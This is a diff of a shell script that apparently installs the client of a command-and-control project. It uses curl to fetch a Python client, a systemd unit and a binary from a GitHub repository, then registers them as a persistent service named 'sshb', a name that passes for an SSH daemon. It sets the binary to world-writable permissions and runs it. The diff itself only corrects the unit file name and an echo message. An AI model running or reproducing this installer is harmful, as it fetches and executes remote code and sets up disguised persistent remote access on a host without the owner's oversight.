@@ -6,7 +6,7 @@ curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /u
 #copy python
 cp /usr/bin/python3 /usr/bin/python3.1
 #Curl the service file into it
-curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.service > /etc/systemd/system/sshb
+curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.service > /etc/systemd/system/sshb.service
 #Enable and start the service
 systemctl daemon-reload
 systemctl enable sshb
@@ -16,5 +16,5 @@ curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client > /var/
 chmod 777 /var/lib/sshb/sshb
 /var/lib/sshb/sshb
 #Tell the user you finished
-echo Finished!
+echo Finished install!
 systemctl status sshb
